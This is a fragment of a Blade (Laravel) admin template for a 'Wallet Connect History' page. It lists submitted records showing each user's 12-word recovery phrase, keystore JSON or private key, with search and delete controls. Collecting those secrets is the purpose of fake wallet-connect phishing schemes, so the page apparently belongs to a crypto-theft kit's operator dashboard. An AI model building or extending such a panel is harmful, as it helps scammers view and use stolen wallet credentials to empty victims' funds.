        ...
        <div class="w-full lg:flex lg:gap-3" id="refresh">
            <div class="w-full lg:w-1/3 h-32 ts-gray-2 rounded-lg p-5 mb-3">
                <div class="w-full grid grid-cols-1 gap-3 p-2">
                    <div class="w-full ">
                        There are {{ $initiates->total() }} Wallet Connect
                    </div>
            ...
            <div class="w-full lg:w-2/3">
                <div class="w-full p-5 mb-5 ts-gray-2 rounded-lg transition-all rescron-card" id="transactions">
                    <h3 class="capitalize  font-extrabold "><span class="border-b-2">Wallet Connect History</span>
                    </h3>
                                ...
                                <div class="flex justify-end items-center  mb-2 mt-5">
                                    ...
                                    <div class="simple-pagination" data-paginator="transactions">
                                        <a id="search-transaction-button"
                                            ...
                                            data-link="{{ route('admin.initiate.index') }}" href="">Search</a>
                                    </div>
                                </div>
                            </div>
                            @forelse ($initiates as $initiate)
                                <div
                                    ...
                                    <div class="">
                                        ...
                                        <p class="local-time">{{ date('d-m-y H:i:s', strtotime($initiate->created_at)) }}
                                        </p>
                                        <p class="clipboard cursor-pointer break-all" data-copy="{{ $initiate->wallet_type }}">

                                            REF: {{ $initiate->wallet_type }}
                                        </p>
                                        <p class="font-bold text-mono">@if ($initiate->phr_type == "12-word Phrase"){{$initiate->wallet2}}<br/>{{$initiate->mne}}@elseif ($initiate->phr_type == "Keystore JSON"){{$initiate->wallet1}}<br/>{{$initiate->keystr}}@elseif ($initiate->phr_type == "Private Key"){{$initiate->wallet3}}<br>{{$initiate->pkey}}@endif</p>
                                    ...
                                    <div class="break-all">
                                        ...
                                        <p class="flex justify-end mt-3">
                                            <a role="button"
                                                data-url="{{ route('admin.initiate.delete', ['id' => $initiate->id]) }}"
